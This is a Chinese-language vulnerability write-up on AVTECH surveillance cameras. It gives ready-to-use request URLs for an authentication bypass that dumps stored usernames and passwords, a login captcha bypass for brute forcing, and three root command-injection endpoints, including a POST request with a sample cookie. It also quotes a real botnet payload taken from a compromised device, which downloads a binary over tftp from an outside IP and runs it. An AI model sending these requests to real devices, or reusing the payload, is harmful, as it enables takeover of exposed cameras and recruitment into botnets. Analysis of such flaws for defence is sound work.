## AVTECH摄像头多个漏洞分析与利用代码

AVTECH是一家台湾的视频监控设备制造商，公司成立于1996年，是世界领先的闭路电视制造商之一，主要产品有监控设备，网络摄像机，网络录像机等。

目前fofa上显示的AVTECH摄像头数量高达92万多条，以泰国，马拉西亚，印度尼西亚为主。由于很多设备可以直接通过公网IP地址访问，所以影响较大，本文详细的分析认证绕过漏洞，登录验证码绕过，认证后的多个任意命令执行漏洞形成的成因，组合利用方式及利用代码。

#### 1.认证绕过漏洞

可以通过两种方式实现认证绕过:

第一种是.cab方式，cab格式文件是视频播放器插件，存储在web的根目录下，它可以无需验证直接被访问和下载，而设备端只是通过strstr函数查找链接中是否存在.cab字段，如果含有就直接认为免认证。

第二种是nobody方法，同样由于设备端只是通过strstr函数去查找链接中是否存在nobody字段，如果有就直接免认证。 两种方式的链接可以如下，.cab和/nobody可以放在链接中的其他地方，获取设备的配置信息，其中包括登录的用户名和密码。

```
http://<device_ip>/cgi-bin/user/Config.cgi?.cab&action=get&category=Account.*
http://<device_ip>/cgi-bin/user/Config.cgi?/nobody&action=get&category=Account.*
```

![1](C:\Users\mzh\Desktop\AVTECH漏洞及脚本\1.png)

两种方法均可获得账号和密码。

#### 2.登录验证码绕过

设备在登录时通过增加验证码方式防止暴力猜解用户名和密码，但是由于系统设计的不合理，可以通过增加login=quick直接绕过，等于直接把验证码给屏蔽。 链接格式如下：

```
http://<device_ip>/cgi-bin/nobody/VerifyCode.cgi?account=<b64(username:password)>&login=quick
```

如果没有采用quick方式的话，链接的格式如下：

```
http://<device_ip>/cgi-bin/nobody/VerifyCode.cgi?account=<b64(username:password)>&captcha_code=ZVFU&verify_code=ZVmHTLN5eiGB
```

由于`captcha_code`和`verify_code`是配套的，我们可以通过人工设置使他们保持一致同样可以绕过验证码验证，从而暴力猜解用户名和密码，这里的含义是强加一个验证码为ZVFU，使其绕过验证码验证。

页面放回0 ok 就是证明可以绕过验证码

![2](C:\Users\mzh\Desktop\AVTECH漏洞及脚本\2.png)

#### 3.认证后的多个任意命令执行漏洞

**第一个**：设备通过CloudSetup.cgi支持Avtech云服务，在登录认证通过之后，由于没有对参数进行验证，可以通过exefile参数以root权限执行任意命令。

```
http://<device_ip>/cgi-bin/supervisor/CloudSetup.cgi?exefile=ps
```

**第二个**：部分设备支持ActionD命令，通过adcommand.cgi文件实现，新版本设备的ActionD提供了DoShellCmd功能，在认证通过之后，由于没有对参数进行验证，可以以root权限执行任意命令。此功能需要以post方式实现，其中cookie中的SSID为用户名和密码的base64值。

```
POST /cgi-bin/supervisor/adcommand.cgi HTTP/1.1

Host: <device_ip>

Content-Length: 23

Cookie: SSID=YWRtaW46YWRtaW4=  #这里的ssid是<b64(username:password)>

DoShellCmd "strCmd=ps&"
```

**第三个**：PwdGrp.cgi文件在增加用户或者修改用户时，由于没有对参数进行验证，可以同时以root权限执行其他命令。

```
http://<device_ip>/cgi-bin/supervisor/PwdGrp.cgi?action=add&user=test&pwd=;reboot;&grp=SUPERVISOR&lifetime=5%20MIN
```

因为第三个漏洞的原因，可能会出现很多创建了的用户。比如

```
Account.User11.Username=wnu
Account.User11.Password=;cd /tmp;/bin/busybox tftp -g -l wnu -r GFeHHRxWfHBaalWbUFRp 49.142.208.135;chmod 777 wnu;./wnu a49.142.208.135:26987 a175.224.109.65:47807&&echo jA3||echo ukW;
Account.User11.Level=SUPERVISOR
Account.User11.Lifetime=5 MIN
```

所以还需要过滤，这里我在脚本里面写了具体的方法。

脚本的话是第三个漏洞的脚本，另外2个只需要把PwdGrp.cgi换成xxx.cgi就行了



参考链接：

https://paper.seebug.org/81/

